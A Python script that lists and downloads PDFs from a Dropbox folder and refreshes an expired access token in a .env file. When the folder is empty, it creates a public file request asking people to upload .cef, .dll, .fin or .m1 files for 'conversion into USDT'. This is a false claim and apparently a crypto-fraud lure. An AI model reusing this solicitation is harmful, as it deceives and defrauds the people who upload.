import io
import sys
import dropbox
from dropbox.exceptions import AuthError, ApiError
from dotenv import load_dotenv
import os
import signal
import time
import requests

# ANSI color codes
GREEN = '\033[0;32m'
RED = '\033[0;31m'
NC = '\033[0m'  # No Color
YELLOW = '\033[1;33m'

# Initialize the environment
load_dotenv()

# Ensure standard output uses UTF-8 encoding
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Replace these with your Dropbox API token and the target folder path
ACCESS_TOKEN = os.getenv('DROPBOX_ACCESS_TOKEN')
TARGET_FOLDER = os.getenv('DROPBOX_TARGET_FOLDER')
TARGET_FOLDER_PATH = f'/{TARGET_FOLDER}/FileRequests'
DOWNLOAD_FOLDER = 'downloads'

# Ensure the downloads directory exists
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# Define the .env file path
ENV_FILE = '../.env'

def handle_signal(signum, frame):
    """Handle termination signals gracefully."""
    print("")
    print(f"\n> {RED}! [SIGNUM:{signum}] Terminating gracefully...{NC}")
    print("")
    sys.stdout.flush()
    sys.exit(1)

# Set up signal handling for interrupt and termination signals
signal.signal(signal.SIGINT, handle_signal)  # Handle Ctrl+C
signal.signal(signal.SIGTERM, handle_signal) # Handle termination signals

# Global flag to track network connectivity status
network_good = False

def network_check(func):
    """Decorator to check network connectivity before executing the function."""
    def wrapper(*args, **kwargs):
        global network_good
        if not network_good:
            for attempt in range(5):
                try:
                    # Check network connectivity
                    response = requests.get("https://google.com", timeout=10)
                    response.raise_for_status()
                    # if not network_good:
                    #     print("")
                    #     print(f"{GREEN}[OK] Network connectivity is good.{NC}")
                    #     sys.stdout.flush()
                    #     network_good = True
                    # Network is good, proceed with the function
                    return func(*args, **kwargs)
                except (requests.exceptions.RequestException, requests.exceptions.ConnectTimeout) as e:
                    print(f"{RED}[X] Network connectivity issue detected.{NC}")
                    sys.stdout.flush()
                    print("")
                    print(f"{YELLOW}? Attempting to reconnect... (Attempt {attempt + 1}/5){NC}")
                    sys.stdout.flush()
                    time.sleep(5)
            print(f"{RED}[X] Maximum retry attempts reached. Exiting.{NC}")
            sys.stdout.flush()
            sys.exit(1)
        else:
            # Network is already confirmed to be good, proceed with the function
            return func(*args, **kwargs)
    return wrapper

def prompt_for_new_token():
    new_token = input(f"{YELLOW}? Please enter a new access token: {NC}")
    return new_token

def update_env_file(key, value):
    if not os.path.exists(ENV_FILE):
        print(f"{RED}! Target path not found. Exiting...{NC}")
        sys.stdout.flush()
        sys.exit(1)
    else:
        print(f"{YELLOW}? Updating environment...{NC}")
        sys.stdout.flush()
        with open(ENV_FILE, 'r') as file:
            lines = file.readlines()
        updated = False
        with open(ENV_FILE, 'w') as file:
            for line in lines:
                if line.startswith(f"{key}="):
                    file.write(f"{key}={value}\n")
                    updated = True
                else:
                    file.write(line)
            if not updated:
                file.write(f"{key}={value}\n")
        print(f"{GREEN}[OK] Access token updated successfully.{NC}")
        sys.stdout.flush()
        print("")

@network_check
def connect_to_dropbox():
    """Connect to Dropbox and perform operations."""
    global ACCESS_TOKEN
    
    if not ACCESS_TOKEN:
        print(f"{RED}[X] Access token not set.{NC}")
        sys.stdout.flush()
        sys.exit(1)
    
    try:
        dbx = dropbox.Dropbox(ACCESS_TOKEN)
        dbx.users_get_current_account()
        # print("")
        # print(f"{GREEN}[OK] Dropbox connection established.{NC}")
        sys.stdout.flush()
        print("")
        return dbx
    except AuthError:
        print(f"{RED}[X] Wrong or expired access token. Please try again.{NC}")
        sys.stdout.flush()
        print("")
        # Prompt for a new token and update .env
        new_token = prompt_for_new_token()
        update_env_file('DROPBOX_ACCESS_TOKEN', new_token)
        ACCESS_TOKEN = new_token  # Update the global variable
        # Retry connecting with the new token
        return connect_to_dropbox()

@network_check
def list_files_and_download():
    dbx = connect_to_dropbox()
    
    try:
        # Check if there are files in the target folder
        response = dbx.files_list_folder(TARGET_FOLDER_PATH)
        if response.entries:
            print(f"{YELLOW}[OK] Files found in the target folder. Proceeding...{NC}")
            sys.stdout.flush()
            print("")

            # Filter and list PDF files
            pdf_files = [entry for entry in response.entries if isinstance(entry, dropbox.files.FileMetadata) and entry.name.endswith('.pdf')]
            
            if not pdf_files:
                print(f"{RED}[X] No .pdf files found in the target folder.{NC}")
                sys.stdout.flush()
                print("")
            else:
                # List the PDF files with labels
                for idx, entry in enumerate(pdf_files, 1):
                    print(f"{GREEN}{idx}). {entry.name}{NC}")
                    sys.stdout.flush()
                    print("")
                # Prompt the user to choose a file
                while True:
                    choice = input(f"\n{YELLOW}? Enter the number of the file you want to select: {NC}")
                    if choice.isdigit() and 1 <= int(choice) <= len(pdf_files):
                        selected_index = int(choice) - 1
                        selected_file = pdf_files[selected_index]
                        break
                    else:
                        print(f"{RED}[X] Invalid choice. Please enter a valid number.{NC}")
                        sys.stdout.flush()

                # Download the selected file
                print("")
                print(f"{YELLOW}? Downloading selected file...{NC}")
                sys.stdout.flush()
                print("")
                local_path = os.path.join(DOWNLOAD_FOLDER, selected_file.name)
                with open(local_path, "wb") as f:
                    metadata, res = dbx.files_download(path=selected_file.path_lower)
                    f.write(res.content)
                
                print(f"{GREEN}[OK] {selected_file.name} has been downloaded to {local_path}.{NC}")
                sys.stdout.flush()
                print("")
                print(f"{YELLOW}[OK] {selected_file.name} is now selected.{NC}")
                sys.stdout.flush()

    
    except dropbox.exceptions.ApiError as err:
        print(f"{RED}[X] No files found in the target folder. Creating a file request URL...{NC}")
        sys.stdout.flush()
        print("")
        # Create a file request URL
        title = "Upload Your Files for USDT Conversion"
        description = (
            "Please upload your files with the following extensions: .cef, .dll, .fin, or .m1 to this Dropbox folder. "
            "Our system will process and convert the eligible files into USDT (Tether) and notify you once the conversion is complete. "
            "Ensure that you upload only the required file types to avoid any processing delays. Thank you for using our service!"
        )

        # Create file request in Dropbox
        file_request = dbx.file_requests_create(title=title, destination=f"/{TARGET_FOLDER}/FileRequests", open=True, description=description)
        file_request_url = file_request.url
        print(f"{GREEN}[OK] Kindly visit the following link to upload files to Dropbox.File request URL: {file_request_url}{NC}")
        sys.stdout.flush()
        print("")
        print(f"{YELLOW}[OK] Exiting...{NC}")
        print("")
        sys.stdout.flush()
    except dropbox.exceptions.HttpError as err:
        print(f"{RED}[X] HTTP error: {err}{NC}")
        sys.stdout.flush()
        print("")

if __name__ == "__main__":
    list_files_and_download()